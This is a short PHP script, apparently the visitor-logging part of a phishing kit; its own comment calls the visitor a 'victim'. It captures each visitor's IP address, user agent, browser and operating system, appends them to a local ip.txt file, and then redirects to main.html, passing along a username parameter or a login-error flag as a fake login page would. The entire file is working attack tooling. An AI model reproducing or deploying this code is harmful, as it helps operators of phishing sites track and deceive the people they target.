<?php

// Grab the victims ip-address
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

// Read User-Agent
$useragent	= $_SERVER['HTTP_USER_AGENT'];
$os			= useragent_os($useragent);
$browser	= useragent_browser($useragent);

// Get OS from useragent string
function useragent_os () {
	$os_array = [
		'/windows nt 10/i'		=>  'Windows-10',
		'/windows nt 6.3/i'		=>  'Windows-8.1',
		'/windows nt 6.2/i'		=>  'Windows-8',
		'/windows nt 6.1/i'		=>  'Windows-7',
		'/windows nt 6.0/i'		=>  'Windows-Vista',
		'/windows nt 5.2/i'		=>  'Windows-Server-2003/XP-x64',
		'/windows nt 5.1/i'		=>  'Windows-XP',
		'/windows xp/i'			=>  'Windows-XP',
		'/windows nt 5.0/i'		=>  'Windows-2000',
		'/windows me/i'			=>  'Windows-ME',
		'/win98/i'				=>  'Windows-98',
		'/win95/i'				=>  'Windows-95',
		'/win16/i'				=>  'Windows-3.11',
		'/linux/i'				=>  'Linux',
		'/ubuntu/i'				=>  'Ubuntu',
		'/iphone/i'				=>  'iPhone',
		'/ipod/i'				=>  'iPod',
		'/ipad/i'				=>  'iPad',
		'/android/i'			=>  'Android',
		'/blackberry/i'			=>  'BlackBerry',
		'/webos/i'				=>  'Mobile',
		'/macintosh|mac os x/i'	=>  'Mac-OS-X',
		'/mac_powerpc/i'		=>  'Mac-OS-9',
		'/x11/i'				=>  'Unix'
	];
	$platform = 'Onbekend';
	foreach ($os_array as $regex => $value) {
		if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
			$platform = $value;
			break;
		}
	}
	return $platform;
}

// Get browser from useragent string
function useragent_browser ($ua) {
	$browser_array = [
		'/msie/i'		=> 'Internet Explorer',
		'/firefox/i'	=> 'Firefox',
		'/chrome/i'		=> 'Chrome',
		'/safari/i'		=> 'Safari',
		'/edge/i'		=> 'Edge',
		'/opera/i'		=> 'Opera',
		'/netscape/i'	=> 'Netscape',
		'/maxthon/i'	=> 'Maxthon',
		'/konqueror/i'	=> 'Konqueror',
		'/mobile/i'		=> 'Mobile Browser'
	];
	$browser = 'Onbekend';
	foreach ($browser_array as $regex => $value) {
		if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
			$browser = $value;
			break;
		}
	}
	return $browser;
}

// Open the file where we write the IP, Browser and OS
$fp = fopen("ip.txt", 'a');
fwrite($fp, "IP-Addres: {$ipaddress}\n");
fwrite($fp, "User-Agent: {$useragent}\n");
fwrite($fp, "Browser: {$browser}\n");
fwrite($fp, "OS: {$os}\n");
fclose($fp);

// Change the location if needed
if (isset($_GET['u']) && !empty($_GET['u'])) {
	header(sprintf('Location: main.html?u=%s', $_GET['u']));
} elseif (isset($_GET['login_error'])) {
	header('Location: main.html?login_error=true');
} else {
	# code...
	header('Location: main.html');
}
exit;
